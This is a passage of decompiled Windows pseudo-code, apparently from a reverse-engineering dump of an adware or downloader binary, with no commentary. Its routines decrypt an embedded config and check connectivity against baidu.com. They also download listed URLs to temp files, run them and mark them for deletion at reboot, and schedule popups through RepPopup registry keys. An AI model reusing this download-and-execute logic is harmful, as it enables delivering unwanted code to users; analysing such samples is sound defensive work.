  *(undefined4 *)(unaff_EBP + -4) = 0;
  *extraout_ECX = &PTR_FUN_0040bed4;
  memset(extraout_ECX + 0x19,0,0x40);
  extraout_ECX[0x29] = 0;
  extraout_ECX[0x2a] = 0;
  extraout_ECX[0x2b] = 0;
  FUN_00403bb2(extraout_ECX + 1,0,0);
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return extraout_ECX;
}



void * __thiscall FUN_00404ecc(void *this,byte param_1)

{
  FUN_00404ee8();
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return this;
}



void FUN_00404ee8(void)

{
  undefined4 *extraout_ECX;
  int unaff_EBP;
  
  FUN_0040a1d0();
  *(undefined4 **)(unaff_EBP + -0x10) = extraout_ECX;
  *extraout_ECX = &PTR_FUN_0040bed4;
  *(undefined4 *)(unaff_EBP + -4) = 0;
  thunk_FUN_0040783f(extraout_ECX + 1);
  FUN_0040504e((int)extraout_ECX);
  if ((void *)extraout_ECX[0x2a] != (void *)0x0) {
    operator_delete((void *)extraout_ECX[0x2a]);
  }
  extraout_ECX[0x2a] = 0;
  extraout_ECX[0x2b] = 0;
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  FUN_00403ba7(extraout_ECX + 1);
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



uint FUN_00404f51(int param_1,uint param_2)

{
  int iVar1;
  byte bVar2;
  uint uVar3;
  
  uVar3 = 0;
  iVar1 = 0xf667;
  if (param_2 != 0) {
    do {
      bVar2 = (byte)((uint)iVar1 >> 8) ^ *(byte *)(uVar3 + param_1);
      *(byte *)(uVar3 + param_1) = bVar2;
      iVar1 = ((uint)bVar2 + iVar1) * -0x3193 + 0x58bf;
      uVar3 = uVar3 + 1;
    } while (uVar3 < param_2);
  }
  return uVar3;
}



uint FUN_00404f8e(int param_1,uint param_2)

{
  byte *pbVar1;
  byte *pbVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  
  uVar5 = 0;
  iVar4 = 0xf667;
  if (param_2 != 0) {
    do {
      uVar3 = (uint)iVar4 >> 8;
      pbVar1 = (byte *)(uVar5 + param_1);
      pbVar2 = (byte *)(uVar5 + param_1);
      iVar4 = ((uint)*pbVar2 + iVar4) * -0x3193 + 0x58bf;
      uVar5 = uVar5 + 1;
      *pbVar1 = (byte)uVar3 ^ *pbVar2;
    } while (uVar5 < param_2);
  }
  return uVar5;
}



uint FUN_00404fd0(byte *param_1,int param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  uint *puVar3;
  int iVar4;
  uint uVar5;
  
  uVar5 = 0;
  uVar1 = ~param_3;
  if (DAT_0040edec == 0) {
    puVar3 = &DAT_0040e9ec;
    do {
      iVar4 = 8;
      uVar2 = uVar5;
      do {
        if ((uVar2 & 1) == 0) {
          uVar2 = uVar2 >> 1;
        }
        else {
          uVar2 = uVar2 >> 1 ^ 0xedb88320;
        }
        iVar4 = iVar4 + -1;
      } while (iVar4 != 0);
      *puVar3 = uVar2;
      puVar3 = puVar3 + 1;
      uVar5 = uVar5 + 1;
    } while (puVar3 < &DAT_0040edec);
    DAT_0040edec = 1;
  }
  if (param_2 != 0) {
    do {
      uVar1 = uVar1 >> 8 ^ (&DAT_0040e9ec)[uVar1 & 0xff ^ (uint)*param_1];
      param_1 = param_1 + 1;
      param_2 = param_2 + -1;
    } while (param_2 != 0);
  }
  return ~uVar1;
}



void __fastcall FUN_0040504e(int param_1)

{
  void *pvVar1;
  uint uVar2;
  int iVar3;
  
  uVar2 = 0;
  if (*(int *)(param_1 + 0x88) != 0) {
    iVar3 = 0;
    do {
      pvVar1 = *(void **)(iVar3 + 0x10 + *(int *)(param_1 + 0xa4));
      if (pvVar1 != (void *)0x0) {
        operator_delete(pvVar1);
      }
      uVar2 = uVar2 + 1;
      iVar3 = iVar3 + 0x18;
    } while (uVar2 < *(uint *)(param_1 + 0x88));
  }
  if (*(void **)(param_1 + 0xa4) != (void *)0x0) {
    operator_delete(*(void **)(param_1 + 0xa4));
  }
  *(undefined4 *)(param_1 + 0xa4) = 0;
  *(undefined4 *)(param_1 + 0x88) = 0;
  return;
}



undefined4 FUN_004050a5(int param_1,uint param_2,void *param_3,void **param_4,uint *param_5)

{
  int iVar1;
  void *pvVar2;
  uint uVar3;
  int iVar4;
  undefined4 local_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uVar3 = 0;
  local_18 = s_UNINT_FILE_FLAG_0040e064._0_4_;
  uStack_14 = s_UNINT_FILE_FLAG_0040e064._4_4_;
  uStack_10 = s_UNINT_FILE_FLAG_0040e064._8_4_;
  uStack_c = s_UNINT_FILE_FLAG_0040e064._12_4_;
  if ((param_1 != 0) && (param_2 != 0)) {
    _strlwr((char *)&local_18);
    do {
      if ((((int)(char)local_18 == (uint)*(byte *)(uVar3 + param_1)) &&
          ((int)local_18._1_1_ == (uint)*(byte *)(uVar3 + 1 + param_1))) &&
         (iVar1 = memcmp(&local_18,(void *)(uVar3 + param_1),0x10), iVar1 == 0)) {
        if (param_5 != (uint *)0x0) {
          *param_5 = uVar3;
        }
        break;
      }
      uVar3 = uVar3 + 1;
    } while (uVar3 <= param_2 - 0x10);
    if ((int)uVar3 <= (int)(param_2 - 0x10)) {
      memcpy(param_3,(void *)(uVar3 + param_1),0x40);
      iVar1 = uVar3 + 0x40;
      if (*(int *)((int)param_3 + 0x24) != 0) {
        pvVar2 = operator_new(*(int *)((int)param_3 + 0x24) * 0x18);
        *param_4 = pvVar2;
        memset(pvVar2,0,*(int *)((int)param_3 + 0x24) * 0x18);
      }
      param_2 = 0;
      if (*(int *)((int)param_3 + 0x24) != 0) {
        iVar4 = 0;
        do {
          memcpy((void *)((int)*param_4 + iVar4),(void *)(param_1 + iVar1),8);
          iVar1 = iVar1 + 8;
          uVar3 = ((int *)((int)*param_4 + iVar4))[1];
          if (uVar3 != 0) {
            if (*(int *)((int)*param_4 + iVar4) != 0) {
              pvVar2 = operator_new(uVar3);
              *(void **)((int)*param_4 + iVar4 + 0x10) = pvVar2;
              memcpy(*(void **)((int)*param_4 + iVar4 + 0x10),(void *)(param_1 + iVar1),
                     *(size_t *)((int)*param_4 + iVar4 + 4));
              FUN_00404f8e(*(int *)((int)*param_4 + iVar4 + 0x10),
                           *(uint *)((int)*param_4 + iVar4 + 4));
            }
            iVar1 = iVar1 + *(int *)((int)*param_4 + iVar4 + 4);
          }
          param_2 = param_2 + 1;
          iVar4 = iVar4 + 0x18;
        } while (param_2 < *(uint *)((int)param_3 + 0x24));
      }
      return 1;
    }
    if (param_5 != (uint *)0x0) {
      *param_5 = param_2;
    }
  }
  return 0;
}



bool __thiscall FUN_004051ff(void *this,LPCSTR param_1,int param_2)

{
  void **ppvVar1;
  int *piVar2;
  uint uVar3;
  HANDLE hFile;
  void *pvVar4;
  int iVar5;
  bool bVar6;
  uint local_10;
  void *local_c;
  DWORD local_8;
  
  iVar5 = 0;
  local_c = (void *)0x0;
  local_8 = 0;
  local_10 = 0;
  FUN_0040504e((int)this);
  hFile = CreateFileA(param_1,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
  if (hFile == (HANDLE)0xffffffff) {
    bVar6 = false;
  }
  else {
    local_8 = GetFileSize(hFile,(LPDWORD)0x0);
    if (local_8 != 0) {
      local_c = operator_new(local_8);
      ReadFile(hFile,local_c,local_8,&local_8,(LPOVERLAPPED)0x0);
    }
    CloseHandle(hFile);
    ppvVar1 = (void **)((int)this + 0xa4);
    FUN_004050a5((int)local_c,local_8,(void *)((int)this + 100),ppvVar1,&local_10);
    if (*(void **)((int)this + 0xa8) != (void *)0x0) {
      operator_delete(*(void **)((int)this + 0xa8));
    }
    *(undefined4 *)((int)this + 0xa8) = 0;
    *(undefined4 *)((int)this + 0xac) = 0;
    if (param_2 == 0) {
      param_1 = (LPCSTR)0x0;
      if (*(int *)((int)this + 0x88) != 0) {
        do {
          piVar2 = (int *)((int)*ppvVar1 + iVar5);
          uVar3 = *(uint *)((int)*ppvVar1 + iVar5 + 4);
          if (((uVar3 != 0) && (*piVar2 == 1)) && (piVar2[4] != 0)) {
            *(uint *)((int)this + 0xac) = uVar3;
            pvVar4 = operator_new(uVar3);
            *(void **)((int)this + 0xa8) = pvVar4;
            memcpy(pvVar4,*(void **)((int)*ppvVar1 + iVar5 + 0x10),*(size_t *)((int)this + 0xac));
            *(undefined4 *)((int)*ppvVar1 + iVar5 + 0x10) = 0;
            *(undefined4 *)((int)*ppvVar1 + iVar5 + 4) = 0;
            *(undefined4 *)((int)*ppvVar1 + iVar5) = 0;
          }
          param_1 = param_1 + 1;
          iVar5 = iVar5 + 0x18;
        } while (param_1 < *(LPCSTR *)((int)this + 0x88));
      }
    }
    else if (local_10 != 0) {
      *(uint *)((int)this + 0xac) = local_10;
      pvVar4 = operator_new(local_10);
      *(void **)((int)this + 0xa8) = pvVar4;
      memcpy(pvVar4,local_c,*(size_t *)((int)this + 0xac));
    }
    operator_delete(local_c);
    bVar6 = *(int *)((int)this + 0x88) != 0;
  }
  return bVar6;
}



bool __fastcall FUN_0040536b(int param_1)

{
  void **this;
  int *piVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  undefined local_5c;
  undefined4 local_5b;
  void *local_1c;
  void **local_18;
  uint local_14;
  void *local_10;
  uint local_c;
  int local_8;
  
  local_5c = 0;
  puVar3 = (undefined4 *)(&local_5c + 1);
  for (iVar2 = 0xf; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = 0;
  local_14 = 0;
  *(undefined *)((int)puVar3 + 2) = 0;
  local_10 = (void *)0x0;
  local_1c = (void *)(param_1 + 4);
  this = (void **)FUN_00403bd4();
  local_c = 0;
  local_18 = this;
  if (*(int *)(param_1 + 0x88) != 0) {
    local_8 = 0;
    do {
      piVar1 = (int *)(*(int *)(param_1 + 0xa4) + local_8);
      if ((*piVar1 == 6) && (iVar2 = FUN_00403e5d(this,(char *)piVar1[4],0,0,0), iVar2 != 0)) {
        FUN_00404107(this,&DAT_0040e3f4);
        iVar2 = FUN_0040448b(this,1);
        if (iVar2 != 0) {
          iVar2 = FUN_00404e53(this,&local_14);
          iVar2 = FUN_004050a5(iVar2,local_14,&local_5c,&local_10,(uint *)0x0);
          if (iVar2 != 0) {
            FUN_0040504e(param_1);
            *(void **)(param_1 + 0xa4) = local_10;
            puVar3 = (undefined4 *)&local_5c;
            puVar4 = (undefined4 *)(param_1 + 100);
            for (iVar2 = 0x10; this = local_18, iVar2 != 0; iVar2 = iVar2 + -1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + 1;
              puVar4 = puVar4 + 1;
            }
            break;
          }
        }
        FUN_00404916(this);
      }
      local_c = local_c + 1;
      local_8 = local_8 + 0x18;
    } while (local_c < *(uint *)(param_1 + 0x88));
  }
  FUN_00403c0e(local_1c,this);
  return local_10 != (void *)0x0;
}



int __fastcall FUN_00405460(int param_1)

{
  void **this;
  int iVar1;
  int iVar2;
  
  iVar2 = 0;
  this = (void **)FUN_00403bd4();
  iVar1 = FUN_00403e5d(this,s_http___www_baidu_com_0040e5a0,0,0,0);
  if (iVar1 != 0) {
    FUN_00404107(this,&DAT_0040e3f4);
    iVar2 = FUN_0040448b(this,1);
    FUN_00404916(this);
  }
  FUN_00403c0e((void *)(param_1 + 4),this);
  return iVar2;
}



undefined4 __thiscall
FUN_004054b0(void *this,LPCSTR param_1,int param_2,LPCVOID param_3,uint param_4)

{
  HANDLE hFile;
  int *piVar1;
  void *pvVar2;
  DWORD DVar3;
  int iVar4;
  undefined4 uVar5;
  uint uVar6;
  int iVar7;
  undefined4 local_14;
  undefined4 local_10;
  int local_c;
  DWORD local_8;
  
  local_14 = 0;
  local_8 = 0;
  local_10 = 0;
  local_c = 0;
  hFile = CreateFileA(param_1,0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0);
  if (hFile == (HANDLE)0xffffffff) {
    uVar5 = 0;
  }
  else {
    if ((param_3 != (LPCVOID)0x0) && (param_4 != 0)) {
      WriteFile(hFile,param_3,param_4,&local_8,(LPOVERLAPPED)0x0);
    }
    WriteFile(hFile,(LPCVOID)((int)this + 100),0x40,&local_8,(LPOVERLAPPED)0x0);
    iVar7 = 0;
    param_4 = 0;
    if (*(int *)((int)this + 0x88) != 0) {
      do {
        if (param_2 == 0) {
          if (*(uint *)(*(int *)((int)this + 0xa4) + iVar7) < 8) goto LAB_00405584;
LAB_00405599:
          WriteFile(hFile,&local_14,8,&local_8,(LPOVERLAPPED)0x0);
        }
        else {
          if (param_2 != 1) {
            if ((param_2 != 2) ||
               ((iVar4 = *(int *)(*(int *)((int)this + 0xa4) + iVar7), iVar4 != 0 && (iVar4 != 1))))
            goto LAB_00405584;
            goto LAB_00405599;
          }
          uVar6 = *(uint *)(*(int *)((int)this + 0xa4) + iVar7);
          if ((uVar6 == 1) || (((uVar6 == 2 || (uVar6 == 3)) || (6 < uVar6)))) goto LAB_00405599;
LAB_00405584:
          piVar1 = (int *)(*(int *)((int)this + 0xa4) + iVar7);
          if (*piVar1 == 0) {
            if (local_c != 0) goto LAB_00405599;
            if (param_2 == 1) {
              iVar4 = *(int *)((int)this + 0x94);
            }
            else {
              iVar4 = *(int *)((int)this + 0x98);
            }
            if (iVar4 == 0) {
              piVar1[1] = 0;
              *(undefined4 *)(iVar7 + 0x10 + *(int *)((int)this + 0xa4)) = 0;
            }
            else {
              if (param_2 == 1) {
                iVar4 = *(int *)((int)this + 0x94);
              }
              else {
                iVar4 = *(int *)((int)this + 0x98);
              }
              piVar1[1] = iVar4;
              pvVar2 = operator_new(*(uint *)(iVar7 + 4 + *(int *)((int)this + 0xa4)));
              *(void **)(iVar7 + 0x10 + *(int *)((int)this + 0xa4)) = pvVar2;
              DVar3 = GetTickCount();
              iVar4 = *(int *)((int)this + 0xa4) + iVar7;
              uVar6 = 0;
              if (*(int *)(iVar4 + 4) != 4) {
                do {
                  *(DWORD *)(*(int *)(iVar4 + 0x10) + uVar6) = DVar3 + uVar6;
                  iVar4 = *(int *)((int)this + 0xa4) + iVar7;
                  uVar6 = uVar6 + 4;
                } while (uVar6 < *(int *)(iVar4 + 4) - 4U);
              }
            }
            local_c = 1;
          }
          WriteFile(hFile,(LPCVOID)(iVar7 + *(int *)((int)this + 0xa4)),8,&local_8,(LPOVERLAPPED)0x0
                   );
          iVar4 = *(int *)((int)this + 0xa4) + iVar7;
          uVar6 = *(uint *)(iVar4 + 4);
          if (uVar6 != 0) {
            FUN_00404f51(*(int *)(iVar4 + 0x10),uVar6);
            iVar4 = *(int *)((int)this + 0xa4) + iVar7;
            WriteFile(hFile,*(LPCVOID *)(iVar4 + 0x10),*(DWORD *)(iVar4 + 4),&local_8,
                      (LPOVERLAPPED)0x0);
            iVar4 = *(int *)((int)this + 0xa4) + iVar7;
            FUN_00404f8e(*(int *)(iVar4 + 0x10),*(uint *)(iVar4 + 4));
          }
          piVar1 = (int *)(*(int *)((int)this + 0xa4) + iVar7);
          if (*piVar1 == 0) {
            piVar1[1] = 0;
            pvVar2 = *(void **)(iVar7 + 0x10 + *(int *)((int)this + 0xa4));
            if (pvVar2 != (void *)0x0) {
              operator_delete(pvVar2);
              *(undefined4 *)(iVar7 + 0x10 + *(int *)((int)this + 0xa4)) = 0;
            }
          }
        }
        param_4 = param_4 + 1;
        iVar7 = iVar7 + 0x18;
      } while (param_4 < *(uint *)((int)this + 0x88));
    }
    CloseHandle(hFile);
    uVar5 = 1;
  }
  return uVar5;
}



DWORD __cdecl FUN_0040570a(char *param_1,char *param_2,LPCSTR param_3,HANDLE *param_4,WORD param_5)

{
  size_t sVar1;
  char *_Dest;
  BOOL BVar2;
  int iVar3;
  LPSTR *ppCVar4;
  _STARTUPINFOA local_5c;
  _PROCESS_INFORMATION local_18;
  DWORD local_8;
  
  ppCVar4 = &local_5c.lpReserved;
  for (iVar3 = 0x10; iVar3 != 0; iVar3 = iVar3 + -1) {
    *ppCVar4 = (LPSTR)0x0;
    ppCVar4 = ppCVar4 + 1;
  }
  local_18.hProcess = (HANDLE)0x0;
  local_18.hThread = (HANDLE)0x0;
  local_18.dwProcessId = 0;
  local_18.dwThreadId = 0;
  iVar3 = 0;
  local_8 = 0;
  local_5c.cb = 0x44;
  if (param_5 != 0xffff) {
    local_5c.wShowWindow = param_5;
    local_5c.dwFlags = 1;
  }
  if (param_1 != (char *)0x0) {
    sVar1 = strlen(param_1);
    iVar3 = sVar1 + 2;
  }
  if (param_2 != (char *)0x0) {
    if (iVar3 != 0) {
      iVar3 = iVar3 + 1;
    }
    sVar1 = strlen(param_2);
    iVar3 = iVar3 + sVar1;
  }
  _Dest = (char *)operator_new(iVar3 + 1U);
  memset(_Dest,0,iVar3 + 1U);
  if (param_1 == (char *)0x0) {
    strcpy(_Dest,param_2);
  }
  else if (param_2 == (char *)0x0) {
    sprintf(_Dest,&DAT_0040e5b8,param_1);
  }
  else {
    sprintf(_Dest,s___s___s_0040e5c0,param_1,param_2);
  }
  BVar2 = CreateProcessA((LPCSTR)0x0,_Dest,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,0,
                         0x30,(LPVOID)0x0,param_3,&local_5c,&local_18);
  if (BVar2 == 0) {
    local_8 = GetLastError();
  }
  else if (param_4 == (HANDLE *)0x0) {
    CloseHandle(local_18.hProcess);
    CloseHandle(local_18.hThread);
  }
  else {
    *param_4 = local_18.hProcess;
    param_4[1] = local_18.hThread;
    param_4[2] = (HANDLE)local_18.dwProcessId;
    param_4[3] = (HANDLE)local_18.dwThreadId;
  }
  if (_Dest != (char *)0x0) {
    operator_delete(_Dest);
  }
  return local_8;
}



void __fastcall FUN_0040581e(int param_1)

{
  DWORD DVar1;
  int *piVar2;
  int iVar3;
  undefined4 *puVar4;
  CHAR local_21c;
  undefined4 local_21b;
  CHAR local_118;
  undefined4 local_117;
  void *local_14;
  int local_10;
  uint local_c;
  void **local_8;
  
  local_118 = '\0';
  puVar4 = &local_117;
  for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined2 *)puVar4 = 0;
  *(undefined *)((int)puVar4 + 2) = 0;
  local_21c = '\0';
  puVar4 = &local_21b;
  for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined2 *)puVar4 = 0;
  *(undefined *)((int)puVar4 + 2) = 0;
  DVar1 = GetTempPathA(0x104,&local_118);
  if (DVar1 == 0) {
    strcpy(&local_118,s_C__Temp_0040e5d0);
    CreateDirectoryA(&local_118,(LPSECURITY_ATTRIBUTES)0x0);
  }
  GetTempFileNameA(&local_118,&DAT_0040e5c8,0,&local_21c);
  local_14 = (void *)(param_1 + 4);
  local_8 = (void **)FUN_00403bd4();
  local_c = 0;
  if (*(int *)(param_1 + 0x88) != 0) {
    local_10 = 0;
    do {
      piVar2 = (int *)(*(int *)(param_1 + 0xa4) + local_10);
      if ((piVar2[1] != 0) && (*piVar2 == 4)) {
        iVar3 = FUN_00403e5d(local_8,(char *)piVar2[4],0,0,0);
        if (iVar3 != 0) {
          GetTempFileNameA(&local_118,&DAT_0040e5c8,0,&local_21c);
          FUN_00404107(local_8,&local_21c);
          iVar3 = FUN_0040448b(local_8,1);
          if (iVar3 != 0) {
            FUN_0040570a(&local_21c,(char *)0x0,(LPCSTR)0x0,(HANDLE *)0x0,0);
            MoveFileExA(&local_21c,(LPCSTR)0x0,4);
          }
          FUN_00404916(local_8);
        }
      }
      local_c = local_c + 1;
      local_10 = local_10 + 0x18;
    } while (local_c < *(uint *)(param_1 + 0x88));
  }
  FUN_00403c0e(local_14,local_8);
  return;
}



// WARNING: Removing unreachable block (ram,0x00405b3e)

undefined4 FUN_00405978(void)

{
  LSTATUS LVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  longlong lVar5;
  _SYSTEMTIME local_40;
  undefined8 local_30;
  uint local_28;
  int local_24;
  DWORD local_20;
  DWORD local_1c;
  undefined4 local_18;
  uint local_14;
  DWORD local_10;
  int local_c;
  HKEY local_8;
  
  local_40.wYear = 0;
  local_40._2_4_ = 0;
  local_40._6_4_ = 0;
  local_40._10_4_ = 0;
  local_40.wMilliseconds = 0;
  local_30._0_4_ = 0;
  local_30._4_4_ = 0;
  local_28 = 0;
  local_24 = 0;
  local_8 = (HKEY)0x0;
  local_20 = 0;
  local_10 = 4;
  GetLocalTime(&local_40);
  uVar3 = (uint)local_40.wYear;
  if (((uVar3 % 4 == 0) && (uVar3 % 100 != 0)) || (local_c = 1, uVar3 % 400 == 0)) {
    local_c = 0;
  }
  uVar3 = (uint)local_40.wYear;
  uVar4 = local_40._2_4_ & 0xffff;
  local_14 = uVar4;
  local_1c = GetTickCount();
  uVar3 = (((((7 < local_40.wMonth) + uVar4) / 2 - (uint)(2 < local_40.wMonth) * (local_c + 1)) +
           (int)(uVar3 - 1) / 400) - (int)(uVar3 - 1) / 100) + (int)(uVar3 - 1) / 4 +
          local_14 * 0x1e + uVar3 * 0x16d + -0x18c + (local_40._6_4_ & 0xffff);
  local_18 = 0;
  lVar5 = __allmul(uVar3,(int)uVar3 >> 0x1f,0x15180,0);
  lVar5 = lVar5 + (int)(((uint)local_40._6_4_ >> 0x10) * 0xe10) +
          (longlong)(int)((local_40._10_4_ & 0xffff) * 0x3c) +
          (longlong)(int)((uint)local_40._10_4_ >> 0x10);
  lVar5 = __allmul((uint)lVar5,(uint)((ulonglong)lVar5 >> 0x20),1000,0);
  local_30 = (lVar5 + (int)(uint)local_40.wMilliseconds) - CONCAT44(local_18,local_1c);
  LVar1 = RegCreateKeyA((HKEY)0x80000002,s_SOFTWARE_RepPopup_0040e5fc,&local_8);
  if (LVar1 == 0) {
    local_10 = 8;
    LVar1 = RegQueryValueExA(local_8,s_BootTime_0040e5f0,(LPDWORD)0x0,&local_20,(LPBYTE)&local_28,
                             &local_10);
    if (LVar1 == 0) {
      iVar2 = (local_24 - local_30._4_4_) - (uint)(local_28 < (uint)local_30);
      lVar5 = CONCAT44(iVar2,local_28 - (uint)local_30);
      if (iVar2 < 1) {
        if (iVar2 < 0) {
          lVar5 = local_30 - CONCAT44(local_24,local_28);
        }
        if (lVar5 < 0x7531) {
          RegCloseKey(local_8);
          return 0;
        }
      }
    }
    RegSetValueExA(local_8,s_BootTime_0040e5f0,0,0xb,(BYTE *)&local_30,8);
    RegCloseKey(local_8);
    RegDeleteKeyA((HKEY)0x80000002,s_SOFTWARE_RepPopup_Page_0040e5d8);
  }
  return 1;
}



int FUN_00405b84(void)

{
  LSTATUS LVar1;
  int *piVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  uint uVar6;
  undefined4 *puVar7;
  longlong lVar8;
  char local_74;
  undefined4 local_73;
  _SYSTEMTIME local_54;
  uint local_44;
  uint local_3c;
  uint local_34;
  int local_30;
  uint local_2c;
  int local_28;
  undefined8 local_24;
  uint local_1c;
  DWORD local_18;
  int local_14;
  DWORD local_10;
  HKEY local_c;
  uint local_8;
  
  local_54.wYear = 0;
  local_54._2_4_ = 0;
  local_54._6_4_ = 0;
  local_54._10_4_ = 0;
  local_54.wMilliseconds = 0;
  local_74 = '\0';
  local_c = (HKEY)0x0;
  puVar7 = &local_73;
  for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar7 = 0;
    puVar7 = puVar7 + 1;
  }
  *(undefined2 *)puVar7 = 0;
  *(undefined *)((int)puVar7 + 2) = 0;
  local_18 = 0;
  local_10 = 4;
  local_24 = 0;
  local_2c = 0;
  local_28 = 0;
  local_34 = 0;
  local_30 = 0;
  GetLocalTime(&local_54);
  uVar6 = (uint)local_54.wYear;
  if (((uVar6 % 4 == 0) && (uVar6 % 100 != 0)) || (uVar6 % 400 == 0)) {
    iVar5 = 0;
  }
  else {
    iVar5 = 1;
  }
  local_1c = local_54._2_4_ & 0xffff;
  local_8 = (uint)(2 < local_54.wMonth) * (iVar5 + 1);
  uVar6 = (((((7 < local_54.wMonth) + local_1c) / 2 - local_8) + (int)(uVar6 - 1) / 400) -
          (int)(uVar6 - 1) / 100) + (int)(uVar6 - 1) / 4 + local_1c * 0x1e + uVar6 * 0x16d + -0x18c
          + (local_54._6_4_ & 0xffff);
  lVar8 = __allmul(uVar6,(int)uVar6 >> 0x1f,0x15180,0);
  lVar8 = lVar8 + (int)(((uint)local_54._6_4_ >> 0x10) * 0xe10) +
          (longlong)(int)((local_54._10_4_ & 0xffff) * 0x3c) +
          (longlong)(int)((uint)local_54._10_4_ >> 0x10);
  local_24 = __allmul((uint)lVar8,(uint)((ulonglong)lVar8 >> 0x20),1000,0);
  local_24 = local_24 + (int)(uint)local_54.wMilliseconds;
  LVar1 = RegCreateKeyA((HKEY)0x80000002,s_SOFTWARE_RepPopup_Page_0040e5d8,&local_c);
  iVar5 = local_14;
  local_8 = 0;
  if (LVar1 == 0) {
    if (*(int *)(local_14 + 0x88) != 0) {
      local_14 = 0;
      do {
        piVar2 = (int *)(*(int *)(iVar5 + 0xa4) + local_14);
        if ((piVar2[1] != 0) && (*piVar2 == 5)) {
          local_1c = FUN_00404fd0((byte *)piVar2[4],piVar2[1],0);
          sprintf(&local_74,s_Open_08X_0040e618,local_1c);
          local_10 = 8;
          local_2c = 0;
          local_28 = 0;
          RegQueryValueExA(local_c,&local_74,(LPDWORD)0x0,&local_18,(LPBYTE)&local_2c,&local_10);
          if ((local_28 <= local_24._4_4_) &&
             ((local_28 < local_24._4_4_ || (local_2c <= (uint)local_24)))) {
            local_3c = (uint)local_24 - local_2c;
            iVar3 = (local_24._4_4_ - local_28) - (uint)((uint)local_24 < local_2c);
            if ((iVar3 < 0) || ((iVar3 < 1 && (local_3c < *(uint *)(iVar5 + 0x8c)))))
            goto LAB_00405e08;
          }
          sprintf(&local_74,s_Try_08X_0040e610,local_1c);
          local_10 = 8;
          local_34 = 0;
          local_30 = 0;
          RegQueryValueExA(local_c,&local_74,(LPDWORD)0x0,&local_18,(LPBYTE)&local_34,&local_10);
          if ((local_30 < local_28) || ((local_30 <= local_28 && (local_34 < local_2c)))) {
LAB_00405e2c:
            RegSetValueExA(local_c,&local_74,0,0xb,(BYTE *)&local_24,8);
            RegCloseKey(local_c);
            piVar2 = *(int **)(iVar5 + 0xa4);
LAB_00405ec9:
            return piVar2[local_8 * 6 + 4];
          }
          if ((local_24._4_4_ < local_30) ||
             ((local_24._4_4_ <= local_30 && ((uint)local_24 < local_34)))) goto LAB_00405e2c;
          local_44 = (uint)local_24 - local_34;
          iVar3 = (local_24._4_4_ - local_30) - (uint)((uint)local_24 < local_34);
          if ((0 < iVar3) || ((-1 < iVar3 && (*(uint *)(iVar5 + 0x90) <= local_44))))
          goto LAB_00405e2c;
        }
LAB_00405e08:
        local_8 = local_8 + 1;
        local_14 = local_14 + 0x18;
      } while (local_8 < *(uint *)(iVar5 + 0x88));
    }
    RegCloseKey(local_c);
  }
  else if (*(int *)(local_14 + 0x88) != 0) {
    piVar2 = *(int **)(local_14 + 0xa4);
    piVar4 = piVar2;
    do {
      if ((piVar4[1] != 0) && (*piVar4 == 5)) {
        uVar6 = piVar4[2];
        iVar5 = piVar4[3];
        if ((local_24._4_4_ < iVar5) || ((local_24._4_4_ <= iVar5 && ((uint)local_24 <= uVar6))))
        goto LAB_00405ec9;
        iVar5 = (local_24._4_4_ - iVar5) - (uint)((uint)local_24 < uVar6);
        if ((0 < iVar5) || ((-1 < iVar5 && (*(uint *)(local_14 + 0x90) <= (uint)local_24 - uVar6))))
        goto LAB_00405ec9;
      }
      local_8 = local_8 + 1;
      piVar4 = piVar4 + 6;
    } while (local_8 < *(uint *)(local_14 + 0x88));
  }
  return 0;
}



undefined4 FUN_00405ecf(byte *param_1)

{
  size_t sVar1;
  LSTATUS LVar2;
  int *piVar3;
  int iVar4;
  uint uVar5;
  undefined4 *puVar6;
  longlong lVar7;
  char local_48;
  undefined4 local_47;
  _SYSTEMTIME local_28;
  undefined8 local_18;
  int local_10;
  int local_c;
  HKEY local_8;
  
  local_28.wYear = 0;
  local_28._2_4_ = 0;
  local_28._6_4_ = 0;
  local_28._10_4_ = 0;
  local_28.wMilliseconds = 0;
  local_48 = '\0';
  local_8 = (HKEY)0x0;
  puVar6 = &local_47;
  for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar6 = 0;
    puVar6 = puVar6 + 1;
  }
  *(undefined2 *)puVar6 = 0;
  *(undefined *)((int)puVar6 + 2) = 0;
  local_18 = 0;
  GetLocalTime(&local_28);
  uVar5 = (uint)local_28.wYear;
  if (((uVar5 % 4 == 0) && (uVar5 % 100 != 0)) || (uVar5 % 400 == 0)) {
    iVar4 = 0;
  }
  else {
    iVar4 = 1;
  }
  local_c = (uint)(2 < local_28.wMonth) * (iVar4 + 1);
  uVar5 = (((((uint)(7 < local_28.wMonth) + (local_28._2_4_ & 0xffff)) / 2 - local_c) +
           (int)(uVar5 - 1) / 400) - (int)(uVar5 - 1) / 100) + (int)(uVar5 - 1) / 4 +
          (local_28._2_4_ & 0xffff) * 0x1e + uVar5 * 0x16d + -0x18c + (local_28._6_4_ & 0xffff);
  lVar7 = __allmul(uVar5,(int)uVar5 >> 0x1f,0x15180,0);
  lVar7 = lVar7 + (int)(((uint)local_28._6_4_ >> 0x10) * 0xe10) +
          (longlong)(int)((local_28._10_4_ & 0xffff) * 0x3c) +
          (longlong)(int)((uint)local_28._10_4_ >> 0x10);
